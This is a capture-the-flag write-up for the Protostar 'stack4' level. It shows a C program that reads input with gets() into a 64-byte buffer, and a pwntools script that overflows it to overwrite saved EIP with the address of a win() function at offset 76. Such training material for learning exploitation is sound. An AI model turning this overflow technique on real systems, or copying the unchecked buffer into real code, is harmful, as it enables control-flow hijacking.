## Challenge Description

Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

This level is at /opt/protostar/bin/stack4

Hints

- A variety of introductory papers into buffer overflows may help.
- gdb lets you do “run < input”
- EIP is not directly after the end of buffer, compiler padding can also increase the size.

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

## Solution

```python
from pwn import *

target = process("./stack4")
elf = context.binary = ELF("./stack4", checksec = False)
context.log_level = "debug"

win = elf.sym.win

payload = b"0"*76 + p32(win) # 76 was the offset which overflowed eip

target.sendline(payload)
target.interactive()
```